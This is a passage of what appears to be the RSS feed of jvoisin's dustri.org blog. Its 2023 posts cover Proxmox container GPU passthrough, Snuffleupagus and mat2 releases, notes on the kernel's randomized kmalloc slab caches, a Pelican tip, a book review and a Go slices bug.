+  really need to have r/w access to the two devices to escalate their
+  privileges anyway, since they would either be:
+  - root already to escape from a container
+  - root already to escape from a vm
+  - whatever proxmox user and likely able to escalate to &lt;code&gt;root&lt;/code&gt; trivially
+  - other users are sandboxed via systemd and/or seccomp.&lt;/p&gt;
+&lt;p&gt;Speaking of mounting things inside the container:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;# &lt;/span&gt;cat&lt;span class="w"&gt; &lt;/span&gt;&amp;gt;&lt;span class="w"&gt; &lt;/span&gt;/etc/pve/lxc/114.conf&lt;span class="w"&gt; &lt;/span&gt;&amp;lt;&amp;lt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;EOF&amp;#39;&lt;/span&gt;
+&lt;span class="go"&gt;lxc.cgroup2.devices.allow: c 226:0 rwm&lt;/span&gt;
+&lt;span class="go"&gt;lxc.cgroup2.devices.allow: c 226:128 rwm&lt;/span&gt;
+&lt;span class="go"&gt;lxc.mount.entry: /dev/dri dev/dri none bind,optional,create=dir&lt;/span&gt;
+&lt;span class="go"&gt;lxc.mount.entry: /dev/dri/renderD128 dev/renderD128 none bind,optional,create=file&lt;/span&gt;
+&lt;span class="go"&gt;EOF&lt;/span&gt;
+&lt;span class="gp"&gt;#&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;You can now run &lt;code&gt;vainfo&lt;/code&gt; inside the container and be delighted by the
+presence of the &lt;a href="https://en.wikipedia.org/wiki/Video_Acceleration_API"&gt;VA-API&lt;/a&gt; version number:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="gp"&gt;# &lt;/span&gt;vainfo&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&amp;gt;/dev/null&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;head&lt;span class="w"&gt; &lt;/span&gt;-n&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
+&lt;span class="go"&gt;libva info: VA-API version 1.17.0&lt;/span&gt;
+&lt;span class="gp"&gt;#&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The last step is to tick all the boxes in &lt;a href="https://jellyfin.org/docs/general/administration/hardware-acceleration/"&gt;Jellyfin's
+preferences&lt;/a&gt;
+and you're good to go. Don't forget to make some space on the disk for the
+transcoding cache, at least until &lt;a href="https://github.com/jellyfin/jellyfin/pull/8744"&gt;this&lt;/a&gt;
+makes its way into a release.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Sun, 01 Oct 2023 22:15:00 +0200</pubDate><guid isPermaLink="false">tag:dustri.org,2023-10-01:/b/video-acceleration-in-jellyfin-inside-a-proxmox-container.html</guid><category>sysadmin</category></item><item><title>Paper notes: Breaking Bad: Quantifying the Addiction of Web Elements to JavaScript</title><link>https://dustri.org/b/paper-notes-breaking-bad-quantifying-the-addiction-of-web-elements-to-javascript.html</link><description>&lt;p&gt;&lt;a href="https://arxiv.org/pdf/2301.10597.pdf"&gt;PDF&lt;/a&gt;, &lt;a href="https://dustri.org/b/files/papers/breaking_bad.pdf"&gt;local mirror&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;More or less all conversations involving the &lt;a href="https://www.torproject.org/download/"&gt;tor browser&lt;/a&gt;
+will at some point contain the following line: "No, javascript isn't disabled
+by default because too many sites would break. You can always crank the
+security slider all the way up if you want tho."&lt;/p&gt;
+&lt;p&gt;We all agree that javascript enables all sorts of despicable behaviours making
+the web a nightmare-material privacy/security cesspit and completely
+inscrutable to a lot of users, so having research done
+to quantify how to make it a better place for everyone is always more than welcome.&lt;/p&gt;
+&lt;p&gt;The main idea of the paper is to load pages from the &lt;a href="https://hispar.cs.duke.edu/"&gt;Hispar
+set&lt;/a&gt; with and without &lt;code&gt;javascript.enabled&lt;/code&gt; set,
+via &lt;a href="https://pptr.dev"&gt;Puppeteer&lt;/a&gt;, and to perform
+magic human-assisted smart diffing to detect user-perceived/perceivable
+breakages. &lt;/p&gt;
+&lt;p&gt;The paper is full of fancy graphs and analysis, but the &lt;a href="https://en.wikipedia.org/wiki/TL;DR"&gt;tldr&lt;/a&gt; is:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;We discover that 43 % of web pages are not strictly dependent on JavaScript
+and that more than 67 % of pages are likely to be usable as long as the visitor
+only requires the content from the main section of the page, for which the user
+most likely reached the page, while reducing the number of tracking requests by
+85 % on average.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;An interesting take is that the usage of javascript framework is the main
+source of breakage, since &lt;s&gt;a lot&lt;/s&gt; all of them result in completely
+unusable websites when javascript is disabled. Moreover, anecdotal data seems
+to suggest that the bigger a company is, the more their website is going to
+break when javascript is disabled.&lt;/p&gt;
+&lt;p&gt;And like every decent paper, it comes with the &lt;a href="https://gitlab.inria.fr/Spirals/breaking-bad"&gt;related code and data published&lt;/a&gt;.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Tue, 26 Sep 2023 17:15:00 +0200</pubDate><guid isPermaLink="false">tag:dustri.org,2023-09-26:/b/paper-notes-breaking-bad-quantifying-the-addiction-of-web-elements-to-javascript.html</guid><category>paper_notes</category></item><item><title>Snuffleupagus 0.10.0 - Babar the Elephant</title><link>https://dustri.org/b/snuffleupagus-0100-babar-the-elephant.html</link><description>&lt;p&gt;&lt;a href="https://snuffleupagus.readthedocs.org"&gt;&lt;img alt="snuffleupagus logo" src="https://dustri.org/b/images/sp.png"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;I just published a new release of
+&lt;a href="https://github.com/jvoisin/snuffleupagus/releases/tag/v0.10.0"&gt;Snuffleupagus&lt;/a&gt;,
+the hardening module for php7+ and php8+,
+version &lt;code&gt;0.9.0&lt;/code&gt;, codename "Babar the Elephant",
+named the &lt;a href="https://en.wikipedia.org/wiki/Babar_the_Elephant"&gt;eponymous character&lt;/a&gt;.
+The main new feature is the PHP8.3 support, but there are a couple of
+quality-of-life improvements for people using Snuffleupagus with fuzzers as
+well.&lt;/p&gt;
+&lt;h3&gt;Changelog&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Compatibility with PHP8.3&lt;/li&gt;
+&lt;li&gt;Add &lt;code&gt;sp.log_max_len&lt;/code&gt; to limit the maximum size of the log messages&lt;/li&gt;
+&lt;li&gt;Add an example configuration for Xenforo 2.2.12 &lt;/li&gt;
+&lt;li&gt;Url encode functions arguments when logging them&lt;/li&gt;
+&lt;li&gt;Fix a possible NULL-byte truncation when outputting parameters in the logs&lt;/li&gt;
+&lt;li&gt;Make &lt;code&gt;readonly_exec&lt;/code&gt; play nice on readonly filesystems &lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;As usual, if you want to help, we have some
+&lt;a href="https://github.com/jvoisin/snuffleupagus/issues?q=is%3Aopen+is%3Aissue+label%3A%22good+first+issue%22"&gt;low hanging fruits&lt;/a&gt; ♥&lt;/p&gt;
+&lt;p&gt;See you in your PHP stack!&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Wed, 20 Sep 2023 15:25:00 +0200</pubDate><guid isPermaLink="false">tag:dustri.org,2023-09-20:/b/snuffleupagus-0100-babar-the-elephant.html</guid><category>php</category></item><item><title>Some notes on "Randomized slab caches for kmalloc()"</title><link>https://dustri.org/b/some-notes-on-randomized-slab-caches-for-kmalloc.html</link><description>&lt;p&gt;Ruiqi Gong and Xiu Jianfeng got their
+&lt;a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3c6152940584290668b35fa0800026f6a1ae05fe"&gt;Randomized slab caches for kmalloc()&lt;/a&gt;
+patch series merged upstream, and I've had enough discussions about it to
+warrant summarising them into a small blogpost.&lt;/p&gt;
+&lt;p&gt;The main idea is to have multiple slab caches, and pick one at random based on
+the address of code calling &lt;code&gt;kmalloc()&lt;/code&gt; and a per-boot seed, to make heap-spraying harder.
+It's a great idea, but comes with some shortcomings for now:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Objects being allocated via wrappers around &lt;code&gt;kmalloc()&lt;/code&gt;, like &lt;code&gt;sock_kmalloc&lt;/code&gt;,
+  &lt;code&gt;f2fs_kmalloc&lt;/code&gt;, &lt;code&gt;aligned_kmalloc&lt;/code&gt;, … will end up in the same slab cache.&lt;/li&gt;
+&lt;li&gt;The slabs needs to be pinned, otherwise an attacker could &lt;a href="https://en.wikipedia.org/wiki/Heap_feng_shui"&gt;feng-shui&lt;/a&gt; their way
+  into having the whole slab free'ed, garbage-collected, and have a slab for
+  another type allocated at the same VA. &lt;a href="https://thejh.net/"&gt;Jann Horn&lt;/a&gt; and &lt;a href="https://infosec.exchange/@nspace"&gt;Matteo Rizzo&lt;/a&gt; have a &lt;a href="https://github.com/torvalds/linux/compare/master...thejh:linux:slub-virtual-upstream"&gt;nice
+  set of patches&lt;/a&gt;,
+  discussed a bit in &lt;a href="https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html"&gt;this Project Zero blogpost&lt;/a&gt;,
+  for a feature called &lt;a href="https://github.com/torvalds/linux/commit/f3afd3a2152353be355b90f5fd4367adbf6a955e"&gt;&lt;code&gt;SLAB_VIRTUAL&lt;/code&gt;&lt;/a&gt;,
+  implementing precisely this.&lt;/li&gt;
+&lt;li&gt;There are 16 slabs by default, so one chance out of 16 to end up in the same
+  slab cache as the target.&lt;/li&gt;
+&lt;li&gt;There are no guard pages between caches, so inter-caches overflows are
+  possible.&lt;/li&gt;
+&lt;li&gt;As pointed by &lt;a href="https://twitter.com/andreyknvl/status/1700267669336080678"&gt;andreyknvl&lt;/a&gt;
+  and &lt;a href="https://infosec.exchange/@minipli/111045336853055793"&gt;minipli&lt;/a&gt;,
+  the fewer allocations hitting a given cache means less noise,
+  so it might even help with some heap feng-shui.&lt;/li&gt;
+&lt;li&gt;minipli also pointed that "randomized caches still freely
+  mix kernel allocations with user controlled ones (&lt;code&gt;xattr&lt;/code&gt;, &lt;code&gt;keyctl&lt;/code&gt;, &lt;code&gt;msg_msg&lt;/code&gt;, …).
+  So even though merging is disabled for these caches, i.e. no direct overlap
+  with &lt;code&gt;cred_jar&lt;/code&gt; etc., other object types can still be targeted (&lt;code&gt;struct
+  pipe_buffer&lt;/code&gt;, BPF maps, its verifier state objects,…). It’s just a matter of
+  probing which allocation index the targeted object falls into.",
+  but I considered this out of scope, since it's much more involved;
+  albeit something like Jann Horn's &lt;a href="https://github.com/thejh/linux/blob/slub-virtual/MITIGATION_README"&gt;&lt;code&gt;CONFIG_KMALLOC_SPLIT_VARSIZE&lt;/code&gt;&lt;/a&gt;
+  wouldn't significantly increase complexity.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Also, while code addresses as a source of entropy has historically be a great
+way to provide &lt;a href="https://lwn.net/Articles/569635/"&gt;KASLR&lt;/a&gt; bypasses, &lt;code&gt;hash_64(caller ^
+random_kmalloc_seed, ilog2(RANDOM_KMALLOC_CACHES_NR + 1))&lt;/code&gt; shouldn't trivially
+leak offsets.&lt;/p&gt;
+&lt;p&gt;The segregation technique is a bit like a weaker version of grsecurity's
+&lt;a href="https://grsecurity.net/how_autoslab_changes_the_memory_unsafety_game"&gt;AUTOSLAB&lt;/a&gt;,
+or a weaker kernel-land version of
+&lt;a href="https://chromium.googlesource.com/chromium/src/+/master/base/allocator/partition_allocator/PartitionAlloc.md"&gt;PartitionAlloc&lt;/a&gt;,
+but to be fair, making use-after-free exploitation harder, and significantly
+harder once pinning lands, with only ~150 lines of code and negligible
+performance impact is amazing and should be praised. Moreover, I wouldn't be
+surprised if this was backported in &lt;a href="https://google.github.io/security-research/kernelctf/rules.html"&gt;Google's KernelCTF&lt;/a&gt;
+soon, so we should see if my analysis is correct.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Mon, 11 Sep 2023 01:45:00 +0200</pubDate><guid isPermaLink="false">tag:dustri.org,2023-09-11:/b/some-notes-on-randomized-slab-caches-for-kmalloc.html</guid><category>security</category></item><item><title>Making use of pygments' filters with Pelican</title><link>https://dustri.org/b/making-use-of-pygments-filters-with-pelican.html</link><description>&lt;p&gt;I've been using &lt;a href="https://github.com/getpelican/pelican"&gt;Pelican&lt;/a&gt;
+more or less since the beginning of this blog and I'm still
+pretty happy about it. Mostly because of how &lt;a href="https://boringtechnology.club"&gt;boring&lt;/a&gt;
+it is, and its complete absence of fundamental changes thorough the years.&lt;/p&gt;
+&lt;p&gt;Anyway, I was looking at how to reduce the size of the pages of my blog
+and looked at how code is syntactically highlighted:
+Pelican is using &lt;a href="https://pygments.org"&gt;Pygments&lt;/a&gt; to do this,
+and looking at its documentation, the &lt;a href="https://pygments.org/docs/filters/#TokenMergeFilter"&gt;TokenMergeFilter&lt;/a&gt;
+should help a bit, by merging token of the same type together,
+instead of highlighting them separately.&lt;/p&gt;
+&lt;p&gt;Pelican's documentation &lt;a href="https://docs.getpelican.com/en/stable/settings.html"&gt;says&lt;/a&gt;
+that options can be passed to python-markdown like this:
+&lt;code&gt;MARKDOWN = { 'extension_configs': { 'markdown.extensions.codehilite': {'css_class': 'highlight'} } }&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Looking at &lt;a href="https://python-markdown.github.io/"&gt;python-markdown&lt;/a&gt;'s &lt;a href="https://python-markdown.github.io/reference/#markdown"&gt;one&lt;/a&gt;,
+one can pass various things as parameters, but it doesn't mention filters.
+&lt;a href="https://pygments.org/docs/filters/"&gt;Pygments documentation on this topic&lt;/a&gt; implies
+that the only way to add filters is to use the &lt;code&gt;add_filter&lt;/code&gt; method on a lexer.&lt;/p&gt;
+&lt;p&gt;But &lt;a href="https://github.com/pygments/pygments/blob/master/pygments/lexer.py"&gt;looking at the code&lt;/a&gt;
+as suggested &lt;a href="https://github.com/Python-Markdown/markdown/issues/1322#issuecomment-1453911760"&gt;here&lt;/a&gt;,
+filters can be passed like any other options, meaning that one only needs to
+add the following code into the &lt;code&gt;pelicanconf.py&lt;/code&gt; file to used the
+&lt;code&gt;TokenMergeFilter&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pelican&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;TokenMergeFilter&lt;/span&gt;
+
+&lt;span class="n"&gt;MARKDOWN&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="s1"&gt;&amp;#39;extension_configs&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="s1"&gt;&amp;#39;markdown.extensions.codehilite&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="s1"&gt;&amp;#39;filters&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;TokenMergeFilter&lt;/span&gt;&lt;span class="p"&gt;()]&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Totally worth the effort for a marginal page size reduction!&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Fri, 01 Sep 2023 18:30:00 +0200</pubDate><guid isPermaLink="false">tag:dustri.org,2023-09-01:/b/making-use-of-pygments-filters-with-pelican.html</guid><category>web</category></item><item><title>Book review: Hacks, Leaks, and Revelations</title><link>https://dustri.org/b/book-review-hacks-leaks-and-revelations.html</link><description>&lt;p&gt;&lt;a href="https://nostarch.com/hacks-leaks-and-revelations"&gt;&lt;img alt="Hacks, Leaks, and Revelations cover" src="https://dustri.org/b/images/HacksLeaksReveleations.png"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Last month, I got an email &lt;a href="https://nostarch.com/about"&gt;from Briana Blackwell from No Starch Press&lt;/a&gt;'s marketing department,
+telling me that &lt;a href="https://hacksandleaks.com/"&gt;Hacks, Leaks, and Revelations: The Art of Analyzing Hacked and Leaked Data&lt;/a&gt;
+by &lt;a href="https://micahflee.com/"&gt;Micah Lee&lt;/a&gt;
+was available in &lt;em&gt;early access&lt;/em&gt;, and that they'd be happy to send me an ebook
+copy free of charge!&lt;/p&gt;
+&lt;p&gt;From the couple of interactions I had with him, Lee is not only a great human being,
+but also technically literate. He's the director of information security
+at &lt;a href="https://theintercept.com/staff/micah-lee/"&gt;The Intercept&lt;/a&gt;, and the person
+behind &lt;a href="https://onionshare.org/"&gt;OnionShare&lt;/a&gt; and &lt;a href="https://dangerzone.rocks/"&gt;DangerZone&lt;/a&gt;;
+so I was thrilled to finally get my hands on his book!&lt;/p&gt;
+&lt;p&gt;And what a great one it is! It's a complete course for everyone who want to learn how to properly deal with and report on large data sets like leaks:
+How to communicate with sources along with some notions of &lt;a href="https://en.wikipedia.org/wiki/Operations_security"&gt;opsec&lt;/a&gt;,
+some words on the ethics of dealing with this kind of data,
+how to get data leaks and how to analyse them
+properly and safely, wrangling tools like
+&lt;a href="https://github.com/freedomofpress/dangerzone"&gt;dangerzone&lt;/a&gt;,
+a &lt;a href="https://en.wikipedia.org/wiki/BitTorrent"&gt;BitTorrent&lt;/a&gt; client,
+&lt;a href="https://signal.org"&gt;Signal&lt;/a&gt;,
+&lt;a href="https://torproject.org"&gt;Tor&lt;/a&gt; via the &lt;a href="https://www.torproject.org/download/"&gt;Tor Browser&lt;/a&gt; and
+&lt;a href="https://onionshare.org/"&gt;Onionshare&lt;/a&gt;,
+some &lt;a href="https://en.wikipedia.org/wiki/Linux"&gt;linux&lt;/a&gt; and &lt;a href="https://en.wikipedia.org/wiki/Shell_(computing)"&gt;shell&lt;/a&gt; basics,
+a crash course into data analysis with &lt;a href="https://python.org"&gt;Python&lt;/a&gt; and &lt;a href="https://en.wikipedia.org/wiki/SQL"&gt;SQL&lt;/a&gt;,
+the &lt;a href="https://occrp.org/en"&gt;OCCRP&lt;/a&gt;'s &lt;a href="https://docs.aleph.occrp.org/"&gt;Aleph&lt;/a&gt;,
+…
+with hands-on exercises and reporting examples based on real leaks like
+&lt;a href="https://en.wikipedia.org/wiki/2021_Epik_data_breach"&gt;EpikFail&lt;/a&gt;,
+&lt;a href="https://en.wikipedia.org/wiki/BlueLeaks"&gt;BlueLeaks&lt;/a&gt;, 
+the &lt;a href="https://apnews.com/article/oath-keepers-leaked-membership-rolls-2ca4195ed3a10e45dd189bf98f3e5a26"&gt;Oath Keepers leak&lt;/a&gt;,
+&lt;a href="https://discordleaks.unicornriot.ninja/discord/"&gt;Unicorn Riot's DiscordLeaks&lt;/a&gt;,
+&lt;a href="https://theintercept.com/2021/09/28/covid-telehealth-hydroxychloroquine-ivermectin-hacked/"&gt;AFLDS&lt;/a&gt;,
+he &lt;a href="https://www.databreaches.net/heritage-foundation-wasnt-attacked-they-leaked-their-own-data/"&gt;Heritage Foundation emails&lt;/a&gt;,
+…&lt;/p&gt;
+&lt;p&gt;It's a comprehensive yet highly digestible resource that I would wholeheartedly
+recommend to anyone remotely interested by modern journalism practises. Hacked
+and dumped databases are all around the internet, waiting to be analysed, reported on,
+contextualised and exposed, and with this book, anyone could help with
+the effort of making the world a better place: sunlight is the best
+disinfectant!&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Wed, 16 Aug 2023 16:15:00 +0200</pubDate><guid isPermaLink="false">tag:dustri.org,2023-08-16:/b/book-review-hacks-leaks-and-revelations.html</guid><category>book_reviews</category></item><item><title>mat2 0.13.4</title><link>https://dustri.org/b/mat2-0134.html</link><description>&lt;p&gt;There is a new minor version of mat2:
+&lt;a href="https://0xacab.org/jvoisin/mat2/tags/0.13.4"&gt;0.13.4&lt;/a&gt;. No ground breaking
+changes, only minor improvements, code modernisation and a bit of hardening:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Add documentation about mat2 on OSX&lt;/li&gt;
+&lt;li&gt;Make use of python3.7 constructs to simplify code&lt;/li&gt;
+&lt;li&gt;Use moderner type annotations&lt;/li&gt;
+&lt;li&gt;Harden &lt;code&gt;get_meta&lt;/code&gt; in archive.py against variants of &lt;a href="https://cve.circl.lu/cve/CVE-2022-35410"&gt;CVE-2021-35410&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Improve MSOffice document support&lt;/li&gt;
+&lt;li&gt;Package the manpage on PyPI.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Thanks to &lt;a href="https://anelki.net/"&gt;akierig&lt;/a&gt;, mat2 is now &lt;a href="https://github.com/macports/macports-ports/pull/18072"&gt;available&lt;/a&gt; in &lt;a href="https://trac.macports.org/"&gt;macports&lt;/a&gt;!&lt;/p&gt;
+&lt;p&gt;As usual, if you know some python help is
+&lt;a href="https://0xacab.org/jvoisin/mat2/issues?label_name%5B%5D=good+first+issue"&gt;welcome&lt;/a&gt;.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">jvoisin</dc:creator><pubDate>Wed, 02 Aug 2023 21:30:00 +0200</pubDate><guid isPermaLink="false">tag:dustri.org,2023-08-02:/b/mat2-0134.html</guid><category>metadata</category></item><item><title>A sneaky Golang bug</title><link>https://dustri.org/b/a-sneaky-golang-bug.html</link><description>&lt;p&gt;Today at work, I needed a function in &lt;a href="https://go.dev/"&gt;Go&lt;/a&gt; to remove
+duplicates from a slice, and thus wrote something like this using the
+&lt;a href="https://go.dev/doc/tutorial/generics"&gt;generic&lt;/a&gt;-based
+&lt;a href="https://pkg.go.dev/golang.org/x/exp/slices"&gt;slices&lt;/a&gt; package:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kd"&gt;func&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;removeDuplicates&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="nx"&gt;mytype&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="nx"&gt;mytype&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nx"&gt;slices&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;SortFunc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;less&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nx"&gt;slices&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;CompactFunc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;eq&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Can you spot the bug? Here are the prototypes of the two functions:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kd"&gt;func&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;SortFunc&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;E&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;any&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="nx"&gt;E&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;less&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;b&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;E&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;bool&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="kd"&gt;func&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;CompactFunc&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;S&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="p"&gt;[]&lt;/span&gt;&lt;span class="nx"&gt;E&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;E&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;any&lt;/span&gt;&lt;span class="p"&gt;](&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;S&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;eq&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;E&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;E&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;bool&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;S&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The first has no return value, while the second does, unused in our case, hence
+the bug. It's &lt;em&gt;interesting&lt;/em&gt; to note that the go compiler is perfectly happy
+with this, and doesn't issue any warning: it was &lt;em&gt;extraordinarily fun&lt;/em&gt; to pinpoint.&lt;/p&gt;
+&lt;p&gt;I reached out to &lt;a href="https://airs.com/ian/"&gt;Ian Lance Taylor&lt;/a&gt; who
+&lt;a href="https://cs.opensource.google/go/x/exp/+/03df57b9a50843fbf23bf90375d6584bcc8ea13d"&gt;implemented&lt;/a&gt;
+those functions in 2021 and he pointed me to &lt;a href="https://go.dev/blog/slices-intro"&gt;Go Slices: usage and internals
+&lt;/a&gt;. Things indeed do become obvious once 
+looking at the &lt;a href="https://github.com/golang/go/blob/master/src/runtime/slice.go"&gt;implementation of
+&lt;code&gt;slice&lt;/code&gt;&lt;/a&gt;:&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;slice&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;struct&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
